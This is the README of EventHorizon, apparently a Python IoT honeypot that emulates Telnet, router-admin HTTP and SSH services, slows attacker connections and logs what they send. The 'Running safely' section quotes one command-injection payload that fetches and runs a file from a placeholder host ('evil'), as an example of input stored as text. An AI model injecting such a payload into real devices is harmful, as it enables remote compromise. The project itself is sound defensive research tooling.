# EventHorizon

EventHorizon is an IoT honeypot written in Python. It emulates a Telnet login, an HTTP router admin page and an SSH banner, then slows responses down to hold client connections open. Session logs and OpenTelemetry traces record what each client sends.

The delay increases with session activity using a bounded heuristic. A replay script generates local test traffic, and a dashboard shows the resulting sessions.

This is an independent honeypot prototype. [ARCHITECTURE.md](ARCHITECTURE.md) covers the implementation and deferred work.

## Running safely

The emulated services log and inspect input without executing it. They return canned responses and make no outbound connections. Telnet rejects every login and never opens a shell. Payloads such as `/cgi-bin/;wget http://evil/m;sh m` are stored as text.

The default bind address is `127.0.0.1`. Use `EH_HOST=0.0.0.0` only in an isolated honeynet. A connection semaphore limits concurrent sessions; byte limits and timeouts bound each session's input and lifetime.

## Architecture

```
                          +-------------------------------+
   attacker / scanner     |        TarpitOrchestrator     |
   ───────────────►  TCP  |  (one asyncio loop, 3 servers)|
                          |                               |
   :2323  telnet ────────►|  TelnetTarpit  ┐              |
   :8080  http   ────────►|  HttpTarpit    ├─ BaseTarpitService
   :2222  ssh    ────────►|  SshTarpit     ┘   • slow drip
                          |                    • Session + events
                          |                    • adaptive latency
                          |                    • OTel span/session
                          +---------+----------------+------+
                                    |                |
                       JSON-lines log         OpenTelemetry (OTLP)
                       ./data/sessions.jsonl   │
                                    |          ▼
                          tools/dashboard.py   otel-collector ─► Jaeger UI
                          (HTML + CLI timeline)
```

See [ARCHITECTURE.md](ARCHITECTURE.md) for the data flow, response timing, trace model and adaptive-delay formula.

## What it emulates

| Service | Port (default) | Emulation | Threat-intel captured |
|---------|---------------|-----------|-----------------------|
| Telnet | `2323` | BusyBox-style login (`(none) login:`), Mirai target. Slow-drips the banner; accepts any creds; always rejects and re-prompts; never opens a shell. | every `username` / `password` tried |
| HTTP | `8080` | Fake router/camera admin UI + UPnP/SOAP control endpoint (`lighttpd`-style `Server` header). Slow-drips headers+body. | request line, method/path, exploit & cmd-injection strings (logged, not run) |
| SSH | `2222` | Classic *endlessh*-style banner tarpit: drips an endless stream of SSH version-ident lines slowly. No crypto, no transport, no auth. | client ident / bytes sent |

## Run it locally (venv)

Requires Python 3.11 or later; development used 3.13. The core tarpit, replay tool and static dashboard use the standard library. Install the dependencies below for OpenTelemetry export and pytest.

```bash
cd 01-eventhorizon-iot-tarpit

# (optional) virtualenv + optional OpenTelemetry deps
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt        # OTel + pytest; OPTIONAL (see "Offline")

# start all three tarpits (binds to 127.0.0.1 by default)
EH_LOG_FILE=./data/sessions.jsonl python -m eventhorizon
```

On startup it prints a summary, e.g.:

```
EventHorizon tarpit started
  host:            127.0.0.1
  telnet:          127.0.0.1:2323
  http:            127.0.0.1:8080
  ssh (banner):    127.0.0.1:2222
  drip_delay:      0.05s  chunk=1B
  adaptive:        on (max x8.0)
  telemetry:       otel-otlp (enabled=True)   # or "noop" if OTel absent
  log:             ./data/sessions.jsonl
  caps:            120.0s / 65536B / 200 conns
```

Connect to the Telnet service:

```bash
# byte-by-byte slow banner; type a username then a password — always rejected
nc 127.0.0.1 2323
```

### Configuration (env vars, prefix `EH_`)

| Var | Default | Meaning |
|-----|---------|---------|
| `EH_HOST` | `127.0.0.1` | bind interface (use `0.0.0.0` only in an isolated honeynet) |
| `EH_TELNET_PORT` / `EH_HTTP_PORT` / `EH_SSH_PORT` | `2323` / `8080` / `2222` | listen ports |
| `EH_DRIP_DELAY` | `0.05` | base seconds between dripped chunks |
| `EH_DRIP_CHUNK` | `1` | bytes per drip step |
| `EH_MAX_SESSION_SECONDS` | `120` | per-session wall-clock cap |
| `EH_MAX_SESSION_BYTES` | `65536` | per-session read cap |
| `EH_MAX_CONNECTIONS` | `200` | global concurrent-connection cap |
| `EH_IDLE_TIMEOUT` | `30` | seconds to wait for attacker input |
| `EH_ADAPTIVE_ENABLED` | `true` | enable the bio-inspired slowdown |
| `EH_ADAPTIVE_MAX_MULTIPLIER` | `8.0` | ceiling on the slowdown factor |
| `EH_LOG_FILE` | *(stdout)* | JSON-lines session log path |
| `EH_OTEL_ENABLED` | `true` | wire OpenTelemetry (no-ops if not installed) |
| `EH_OTEL_ENDPOINT` | `http://localhost:4317` | OTLP gRPC collector |
| `EH_SERVICE_NAME` | `eventhorizon-tarpit` | OTel `service.name` |

## Replay lab traffic

`tools/replay_attacker.py` connects to each service and sends test probes: default-credential login attempts, a router-admin GET, a UPnP SOAP request and an SSH identification string. It reports elapsed time and response bytes.

```bash
python tools/replay_attacker.py \
  --host 127.0.0.1 --telnet-port 2323 --http-port 8080 --ssh-port 2222 \
  --duration 4
```

Example output from a local replay:

```
service       elapsed(s)     bytes  sample / error
------------------------------------------------------------------------
telnet              4.01        74  '\r\nLogin incorrect\r\n\r\n(none) login: '
http                2.01       130  'HTTP/1.1 200 OK\r\nServer: lighttpd/1.4.39 ...'
http-soap           2.01       125  'HTTP/1.1 200 OK\r\nServer: lighttpd/1.4.39 ...'
ssh                 2.01        76  'SSH-2.0-OpenSSH_7.3 hcrCRSxRdg6 ...'
```

## Attacker-session dashboard

`tools/dashboard.py` reads the JSON-lines log and renders a protocol timeline for each session. It uses the Python standard library.

```bash
# CLI summary table
python tools/dashboard.py --log ./data/sessions.jsonl --cli

# self-contained static HTML (no JS frameworks, no CDN)
python tools/dashboard.py --log ./data/sessions.jsonl --out dashboard.html

# serve it
python tools/dashboard.py --log ./data/sessions.jsonl --serve --serve-port 8088
# -> http://127.0.0.1:8088/dashboard.html
```

The HTML shows each session as a collapsible card (service, source, dwell time,
rx/tx bytes) with an expandable event timeline (connect → recv → command →
drip → close), colour-coded by event kind. Total "attacker time wasted" is the
sum of session dwell times.

## Run via Docker Compose (tarpit + collector + Jaeger)

```bash
docker compose up --build
```

Compose starts three services:

- tarpit, the honeypot (`EH_HOST=0.0.0.0` *inside* the container; published
  to `127.0.0.1` on the host for a safe demo).
- otel-collector, receives OTLP spans and forwards to Jaeger (also logs
  spans to its own stdout for quick debugging).
- jaeger, trace UI.

Generate traffic and open the trace viewer:

```bash
# generate traffic from the host
python tools/replay_attacker.py --host 127.0.0.1

# view traces
open http://127.0.0.1:16686        # Jaeger UI; pick service "eventhorizon-tarpit"
```

Validate the compose file without building:

```bash
docker compose -f docker-compose.yml config
```

## Viewing traces

Each attacker session is one OpenTelemetry span (`session.<service>`) with
attributes (`eventhorizon.service`, `eventhorizon.src.ip`,
`eventhorizon.src.port`, `eventhorizon.session.id`) and span-events for each
interaction (`recv`, `drip`, `login_attempt`, `http_request`, `banner_drip`).

- With a collector: spans flow over OTLP → collector → Jaeger
  (`http://127.0.0.1:16686`).
- Without a collector: if `EH_OTEL_ENDPOINT` is empty, EventHorizon falls
  back to the console span exporter, so traces print to stdout.
- Without OpenTelemetry installed: a no-op shim disables trace export; the
  tarpit keeps recording sessions to JSONL.

## Tests

```bash
pytest -q
```

The tests cover response timing over localhost sockets, session recording, credential capture, resource limits, adaptive delays and the telemetry fallback. They also check that HTTP exploit strings are logged without being executed. Test delays are kept short. The async shim in `tests/conftest.py` lets the tests run without `pytest-asyncio`; pytest itself is required.

## Offline use

The core tarpit, JSONL logging, replay tool and static dashboard work without OpenTelemetry. If the package is missing, the telemetry module uses a no-op backend and session logging continues. Running the tests requires pytest to be installed already.

## Scope

The protocol handlers share `BaseTarpitService`, which handles connection limits, response timing, session logs and traces. The adaptive delay is a per-session heuristic based on activity and age. Machine-learning models and richer protocol emulation are deferred; see ARCHITECTURE.md.

## Repository layout

```
01-eventhorizon-iot-tarpit/
├── eventhorizon/              # the package
│   ├── __init__.py
│   ├── __main__.py            # `python -m eventhorizon`
│   ├── config.py              # env-driven TarpitConfig (safe defaults)
│   ├── session.py             # Session/Event model + JSON-lines logger
│   ├── telemetry.py           # OpenTelemetry setup + no-op shim
│   ├── adaptive.py            # bio-inspired (immune-response) latency
│   ├── server.py              # TarpitOrchestrator (entrypoint)
│   └── services/
│       ├── base.py            # BaseTarpitService: drip, caps, span, session
│       ├── telnet.py          # fake BusyBox login
│       ├── http.py            # fake router/camera + UPnP/SOAP
│       └── ssh.py             # endlessh-style banner drip
├── tools/
│   ├── replay_attacker.py     # client-only lab traffic generator
│   └── dashboard.py           # stdlib session-timeline dashboard (CLI+HTML)
├── tests/                     # pytest (stdlib-only friendly)
├── requirements.txt           # OPTIONAL deps (OTel, pytest)
├── Dockerfile                 # slim, non-root, offline-tolerant
├── docker-compose.yml         # tarpit + otel-collector + jaeger
├── otel-collector-config.yaml
├── README.md
└── ARCHITECTURE.md
```
